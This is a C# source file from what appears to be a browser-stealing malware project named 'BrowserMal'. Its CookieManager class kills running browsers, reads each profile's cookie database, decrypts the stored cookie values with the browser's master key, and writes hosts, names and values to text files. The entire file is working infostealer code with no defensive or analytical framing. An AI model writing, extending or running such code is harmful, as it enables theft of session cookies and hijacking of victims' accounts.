using BrowserMal.AES;
using BrowserMal.Browser;
using BrowserMal.Filesaver;
using BrowserMal.Util;
using SqliteReader;
using System.Collections.Generic;
using System.IO;

namespace BrowserMal.Cookie
{
    public class CookieManager
    {
        private static Dictionary<string, List<CookieModel>> cookiesModel;

        public CookieManager() => cookiesModel = new Dictionary<string, List<CookieModel>>();

        public void Init(ref List<BrowserModel> browsers)
        {
            foreach (BrowserModel browser in browsers)
            {
                if (!Directory.Exists(browser.Location))
                    continue;

                ProcessUtil.KillProcess(browser.ProcessName);

                List<CookieModel> logins = GetLogins(browser.Location, browser.MasterKey);

                if (logins.Count == 0)
                    continue;

                cookiesModel.Add(browser.Name, logins);

                FileManager.Save<CookieModel>(logins, $"{browser.Name}_cookies.txt");
            }
        }

        private List<CookieModel> GetLogins(string path, byte[] masterKey)
        {
            List<string> profiles = Browser.Util.GetAllProfiles(path, Browser.Util.COOKIES);
            List<CookieModel> creds = new List<CookieModel>();

            foreach (string profile in profiles)
            {
                if (!File.Exists(profile))
                    continue;

                creds.AddRange(GetProfileLogins(profile, masterKey));
            }

            return creds;
        }

        private List<CookieModel> GetProfileLogins(string path, byte[] masterKey)
        {
            List<CookieModel> cookiesModel = new List<CookieModel>();

            SqLiteHandler sqLiteHandler = new SqLiteHandler(path);
            sqLiteHandler.ReadTable("cookies");

            //byte[] masterKey = AesGcm256.GetMasterKey(localStatePath);

            if (masterKey == null)
                return new List<CookieModel>();

            for (int i = 0; i <= sqLiteHandler.GetRowCount() - 1; i++)
            {
                try
                {
                    string cookieValue = AesGcm256.GetEncryptedValue(sqLiteHandler.GetValue(i, "encrypted_value"), masterKey);

                    if (string.IsNullOrEmpty(cookieValue))
                        continue;

                    cookiesModel.Add(new CookieModel()
                    {
                        Host = sqLiteHandler.GetValue(i, "host_key"),
                        Name = sqLiteHandler.GetValue(i, "name"),
                        Value = cookieValue
                    });
                }
                catch { }
            }

            return cookiesModel;
        }
    }
}
